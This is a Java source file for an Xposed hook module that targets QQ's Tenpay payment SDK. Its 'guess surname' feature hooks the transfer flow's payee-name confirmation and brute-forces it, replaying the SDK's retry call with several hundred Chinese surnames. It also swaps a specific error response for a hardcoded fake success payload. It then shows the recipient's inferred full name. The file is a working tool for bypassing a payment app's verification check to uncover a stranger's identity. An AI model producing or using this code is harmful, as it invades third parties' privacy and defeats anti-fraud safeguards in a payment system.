package moe.ono.hooks.item.sigma;

import static de.robv.android.xposed.XposedHelpers.findMethodExact;
import static moe.ono.constants.Constants.PrekCfgXXX;
import static moe.ono.hooks._core.factory.HookItemFactory.getItem;
import static moe.ono.util.Initiator.loadClass;

import android.app.Activity;
import android.app.Dialog;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.DialogInterface;
import android.os.Build;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.widget.TextView;

import androidx.annotation.NonNull;

import org.json.JSONObject;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Objects;

import de.robv.android.xposed.XC_MethodHook;
import moe.ono.config.ConfigManager;
import moe.ono.hooks._base.BaseClickableFunctionHookItem;
import moe.ono.hooks._core.annotation.HookItem;
import moe.ono.util.Logger;
import moe.ono.util.SyncUtils;

@HookItem(
        path = "Sigma/猜姓氏",
        description = "给好友/陌生人大额转账触发（如5000元）\n* 重启生效"
)
public class QQSurnamePredictor extends BaseClickableFunctionHookItem {
    public boolean stop_flag = false;
    public boolean start_flag = false;
    private final ArrayList<String> lst_tried_surname = new ArrayList<>();
    List<String> lst_surname = Arrays.asList(
            "赵", "钱", "孙", "李", "周", "吴", "郑", "王", "冯", "陈", "褚", "卫", "蒋", "沈", "韩", "杨",
            "朱", "秦", "尤", "许", "何", "吕", "施", "张", "孔", "曹", "严", "华", "金", "魏", "陶", "姜",
            "戚", "谢", "邹", "喻", "柏", "水", "刘", "章", "云", "苏", "潘", "葛", "奚", "范", "彭", "郎",
            "鲁", "韦", "昌", "马", "苗", "凤", "花", "方", "俞", "任", "袁", "柳", "酆", "鲍", "史", "唐",
            "费", "廉", "岑", "薛", "雷", "贺", "倪", "汤", "滕", "殷", "罗", "毕", "郝", "邬", "安", "常",
            "乐", "于", "时", "傅", "皮", "卞", "齐", "康", "伍", "余", "元", "卜", "顾", "孟", "平", "黄",
            "和", "穆", "萧", "尹", "姚", "邵", "湛", "汪", "祁", "毛", "禹", "狄", "米", "贝", "明", "臧",
            "计", "伏", "成", "戴", "谈", "宋", "茅", "庞", "熊", "纪", "舒", "屈", "项", "祝", "董", "梁",
            "杜", "阮", "蓝", "闵", "席", "季", "麻", "强", "贾", "路", "娄", "危", "江", "童", "颜", "郭",
            "梅", "盛", "林", "刁", "钟", "徐", "邱", "骆", "高", "夏", "蔡", "田", "樊", "胡", "凌", "霍",
            "虞", "万", "支", "柯", "昝", "管", "卢", "莫", "经", "房", "裘", "缪", "干", "解", "应", "宗",
            "丁", "宣", "贲", "邓", "郁", "单", "杭", "洪", "包", "诸", "左", "石", "崔", "吉", "钮", "龚",
            "程", "嵇", "邢", "滑", "裴", "陆", "荣", "翁", "荀", "羊", "於", "惠", "甄", "曲", "家", "封",
            "芮", "羿", "储", "靳", "汲", "邴", "糜", "松", "井", "段", "富", "巫", "乌", "焦", "巴", "弓",
            "牧", "隗", "山", "谷", "车", "侯", "宓", "蓬", "全", "郗", "班", "仰", "秋", "仲", "伊", "宫",
            "宁", "仇", "栾", "暴", "甘", "钭", "厉", "戎", "祖", "武", "符", "景", "詹", "束", "龙", "窦",
            "叶", "幸", "司", "韶", "郜", "黎", "蓟", "薄", "印", "宿", "白", "怀", "蒲", "邰", "从", "鄂",
            "索", "咸", "籍", "赖", "卓", "蔺", "屠", "蒙", "池", "乔", "阴", "郁", "胥", "能", "苍", "双",
            "闻", "莘", "党", "翟", "谭", "贡", "劳", "逄", "姬", "申", "扶", "堵", "冉", "宰", "郦", "雍",
            "郤", "璩", "桑", "桂", "濮", "牛", "寿", "通", "边", "扈", "燕", "冀", "郏", "浦", "尚", "农",
            "温", "别", "庄", "晏", "柴", "瞿", "阎", "充", "慕", "连", "茹", "习", "宦", "艾", "鱼", "容",
            "向", "古", "易", "慎", "戈", "廖", "庾", "终", "暨", "居", "衡", "步", "都", "耿", "满", "弘",
            "匡", "国", "文", "寇", "广", "禄", "阙", "东", "欧", "殳", "沃", "利", "蔚", "越", "夔", "隆",
            "师", "巩", "厍", "聂", "晁", "勾", "敖", "融", "冷", "訾", "辛", "阚", "那", "简", "饶", "空",
            "曾", "母", "沙", "乜", "养", "鞠", "须", "丰", "巢", "关", "蒯", "相", "查", "后", "荆", "红",
            "游", "竺", "权", "逯", "盖", "益", "桓", "公", "商", "牟", "佘", "佴", "伯", "赏",
            "墨", "哈", "谯", "笪", "年", "爱", "阳", "佟", "言", "福", "微", "生", "岳", "帅", "缑", "亢",
            "况", "后", "有", "琴", "晋", "楚", "闫", "法", "汝", "鄢", "涂", "钦", "肖",
            "万俟", "司马", "上官", "欧阳", "夏侯", "诸葛", "南宫",
            "闻人", "东方", "赫连", "皇甫", "尉迟", "公羊", "澹台", "公冶", "宗政", "濮阳", "淳于", "单于",
            "太叔", "申屠", "公孙", "仲孙", "轩辕", "令狐", "钟离", "宇文", "长孙", "慕容", "鲜于", "闾丘",
            "司徒", "司空", "亓官", "司寇", "仉督", "子车", "颛孙", "端木", "巫马", "公西", "漆雕", "乐正",
            "壤驷", "公良", "拓跋", "夹谷", "宰父", "榖梁",
            "段干", "百里", "东郭", "南门", "呼延", "归", "海", "羊舌", "梁丘", "左丘", "东门", "西门", "第五"
    );
    private String name;
    private int failCount = 0;
    
    private Method showSlideAcceptDialog;
    private Method showQQToastInUiThreadMethod;



    @Override
    public void entry(@NonNull ClassLoader classLoader) throws Throwable {
        doInit();
        try {
            doHook();
        } catch (ClassNotFoundException e) {
            Logger.e(e);
        }
    }

    private void doInit() {
        Logger.i("GuessSurname -> init");
        try {
            Class<?> QQToastUtilClass = loadClass("com.tencent.util.QQToastUtil");
            showQQToastInUiThreadMethod = QQToastUtilClass.getDeclaredMethod("showQQToastInUiThread", int.class, String.class);
            Class<?> QQCustomDialogClass = loadClass("com.tencent.mobileqq.utils.DialogUtil");
            showSlideAcceptDialog = QQCustomDialogClass.getDeclaredMethod(
                    "showSlideAcceptDialog",
                    Activity.class,
                    String.class,
                    String.class,
                    DialogInterface.OnClickListener.class,
                    DialogInterface.OnClickListener.class,
                    DialogInterface.OnCancelListener.class);
        } catch (Exception e) {
            Logger.e(e);
        }

    }

    private void doHook() throws ClassNotFoundException {
        Logger.i("GuessSurname -> doHook(load class)");
        Class<?> cRetryAbility = loadClass("com.tenpay.sdk.net.core.request.RetryAbility");
        Class<?> cFunction0 = loadClass("kotlin.jvm.functions.Function0");
        Class<?> cSessionKey = loadClass("com.tenpay.sdk.net.core.comm.SessionKey");
        Class<?> cStatisticInfo = loadClass("com.tenpay.sdk.net.core.statistic.StatisticInfo");
        Class<?> cPayActivity = loadClass("com.tenpay.sdk.activity.PayActivity");
        Class<?> cConfirmRequestAction = loadClass("com.tenpay.sdk.net.core.actions.ConfirmRequestAction");
        Class<?> cEncryptProcessor = loadClass("com.tenpay.sdk.net.core.processor.EncryptProcessor");
        Class<?> cNetResult = loadClass("com.tenpay.sdk.net.core.result.NetResult");

        Logger.i("=----------------- doHook -----------------=");


        /////// onCreateView#com.tenpay.sdk.activity.PayActivity ///////
        Method m = findMethodExact(cPayActivity, "onCreateView", android.view.LayoutInflater.class, android.view.ViewGroup.class, android.os.Bundle.class);
        hookBefore(m, param -> {
            Context context = ((ViewGroup) param.args[1]).getContext();
            doOnStop(context);
        });


        /////// fillNameRequestAction#com.tenpay.sdk.net.core.actions.ConfirmRequestAction ///////
        Method m2 = findMethodExact(cConfirmRequestAction, "fillNameRequestAction", android.content.Context.class, java.lang.String.class, org.json.JSONObject.class, cRetryAbility, cFunction0);
        hookBefore(m2, param -> {
            Logger.i("ConfirmRequestAction -> on beforeHookedMethod");
            start_flag = true;
            stop_flag = false;
            lst_tried_surname.clear();

//                Context context = (Context) param.args[0];
            String string = (String) param.args[1];
            JSONObject jsonObject = (JSONObject) param.args[2];
            Object retryAbility = param.args[3];
            Object function0 = param.args[4];

            new Thread(() -> {
                failCount = 0;
                try {
                    for (String surname : lst_surname) {
                        if (stop_flag) {
                            Logger.w("stop!! reason: stop_flag==true");
                            return;
                        }
                        Method retryMethod = retryAbility.getClass().getMethod("retry", Map.class);
                        Method functionMethod = function0.getClass().getMethod("invoke");
                        Map<String, String> extraMap = new HashMap<>();
                        extraMap.put("step", "2");
                        extraMap.put("fillName", surname);
                        Logger.w("fillName: " + surname);
                        Toast(surname, 0);

                        functionMethod.invoke(function0);
                        retryMethod.invoke(retryAbility, extraMap);
                        Thread.sleep(ConfigManager.dGetInt(PrekCfgXXX + getItem(QQSurnamePredictor.class).getPath(), 300));
                    }
                    Toast("跑完了", 1);
                } catch (NoSuchMethodException | IllegalAccessException |
                         InvocationTargetException e) {
                    Logger.e("The method 'retry' does not exist.");
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }).start();

            Logger.d("string: " + string);
            Logger.d("jsonObject: " + jsonObject.toString());
            Logger.d("retryAbility: " + retryAbility.toString());
            Logger.d("function0: " + function0.toString());


            name = string;
            Toast("(?)"+name, 0);

        });

        /////// encryptExtra#com.tenpay.sdk.net.core.processor.EncryptProcessor ///////
        Method m3 = findMethodExact(cEncryptProcessor, "encryptExtra",
                java.lang.String.class,
                cSessionKey,
                boolean.class,
                boolean.class,
                java.util.Map.class, java.util.Map.class, java.util.Map.class, cStatisticInfo);
        hookBefore(m3, param -> {
            Map<String, String> processResult = (Map<String, String>) param.args[5];

            String strProcessResult = processResult.toString();
            Logger.d("before encrypt processResult : " + strProcessResult);
            if (!start_flag) {
                return;
            }

            String encodedFillName = processResult.get("fillName");
            if (encodedFillName != null) {
                String decodedFillName = null;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    decodedFillName = URLDecoder.decode(encodedFillName, StandardCharsets.UTF_8);
                }
                lst_tried_surname.add(decodedFillName);
            }

        });

        /////// setBizResponse#com.tenpay.sdk.net.core.result.NetResult ///////
        Method m4 = findMethodExact(cNetResult, "setBizResponse", java.lang.Object.class);
        hookBefore(m4, new HookAction() {
            @Override
            public void call(XC_MethodHook.MethodHookParam param) throws Throwable {
                Logger.i("NetResult -> on beforeHookedMethod");
                Object obj = param.args[0];
                Logger.d("NetResult - obj ->"+ obj);
                try {
                    JSONObject jsonObject = (JSONObject) obj;
                    if (jsonObject.getInt("retcode") == 66217329){
                        failCount++;
                    }
                    if (jsonObject.getInt("retcode") == 88420607){
                        param.args[0] = new JSONObject("{\"retcode\":\"0\",\"retmsg\":\"success\",\"bargainor_id\":\"1000026901\",\"callback_url\":\"https%3A%2F%2Fmqq.tenpay.com%2Fv2%2Fhybrid%2Fwww%2Fmobile_qq%2Fpayment%2Fpay_result.shtml%3F_wv%3D1027%26channel%3D2\",\"pay_flag\":\"1\",\"pay_time\":\"2025-01-11 14:39:39\",\"real_fee\":\"1\",\"sp_billno\":\"101000026901502501111449053901\",\"sp_data\":\"attach%3DCgQKABABEpgBEP3bqNkIGgzpgKLlnLrkvZzmiI8gj4fnowkqFOKAj8Kg5bCP6bOE6bG85ZyoLi4uMAE4AUAASAFQAFonMjQwOTo4OTI5OjYxNTM6NGQzYjoyODZiOmRkZmY6ZmU2YjphMzdhaixtckpmeHZkZ1B4OHp2b3VBbERaYS1TeVFheHhnNjluSUhjdU5VQk9FZG1BX3AbegCIAQEYACIAMKekiLwG%26bank_billno%3D512501114718503144122%26bank_type%3D2024%26bargainor_id%3D1000026901%26charset%3D2%26fee_type%3D1%26pay_result%3D0%26purchase_alias%3D50442191810%26sign%3D76697FB4507EA98DA3C9F7744E040D29%26sp_billno%3D101000026901502501111449053901%26time_end%3D20250111143939%26total_fee%3D1%26transaction_id%3D100002690125011100047212039062060810%26ver%3D2.0\",\"transaction_id\":\"100002690125011100047212039062060810\",\"send_flag\":\"0\"}");
                    }
                } catch (Exception ignored) {}
                try {
                    JSONObject jsonObject = (JSONObject) obj;
                    if (Objects.equals(jsonObject.getString("retcode"), "0")){
                        stop_flag = true;
                        Logger.w("stop_flag = true");
                    }
                } catch (Exception ignored) {}
            }
        });

        Logger.i("^----------------- over -----------------^");
    }


    private void doOnStop(Context context) throws InvocationTargetException, IllegalAccessException {
        Logger.d("GuessSurname - doOnStop!! tried_surname_list=" + lst_tried_surname);
        if (!lst_tried_surname.isEmpty()) {
            Logger.d("failCount=" + failCount);
            String lastElement = lst_tried_surname.get(failCount);

            DialogInterface.OnClickListener positiveListener = (dialog, which) -> {};
            DialogInterface.OnCancelListener cancelListener = dialog -> {};
            DialogInterface.OnClickListener negativeListener = (dialog, which) -> {
                ClipboardManager clipboard = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
                ClipData clip = ClipData.newPlainText("label", lastElement);
                clipboard.setPrimaryClip(clip);
                Toast("复制成功", 2);
            };
            Dialog dialog = (Dialog) showSlideAcceptDialog.invoke(null, context,
                    "TA可能是：" + lastElement+name,
                    "尝试列表:\n" + lst_tried_surname,
                    positiveListener, negativeListener, cancelListener);
            assert dialog != null;
            try {
                setupDialogFont(dialog);
                dialog.show();
            } catch (Exception e) {
                Logger.e(e);
            }
        }
    }

    /* ----------------------------------------------------------------------------------- */

    public void Toast(String content, int type) {
        SyncUtils.runOnUiThread(() -> {
            try {
                showQQToastInUiThreadMethod.invoke(null, type, content);
            } catch (Throwable e) {
                Logger.e(e);
            }
        });

    }

    private static void setupDialogFont(Dialog dialog) {
        Window window = dialog.getWindow();
        assert window != null;
        View view = window.getDecorView();
        doSetupDialogViewFont(view, 15);
    }

    private static void doSetupDialogViewFont(View view, int size) {
        if (view instanceof ViewGroup parent) {
            int count = parent.getChildCount();
            for (int i = 0; i < count; i++) {
                doSetupDialogViewFont(parent.getChildAt(i), size);
            }
        } else if (view instanceof TextView textview) {
            String text = textview.getText().toString();

            textview.setTextIsSelectable(true);
            textview.setTextSize(size);

            if (text.equals("取消")) {
                textview.setText("关闭");
            } else if (text.equals("确定")) {
                textview.setText("复制");
            }
        }
    }

    @Override
    public int targetProcess() {
        return SyncUtils.PROC_TOOL;
    }
}
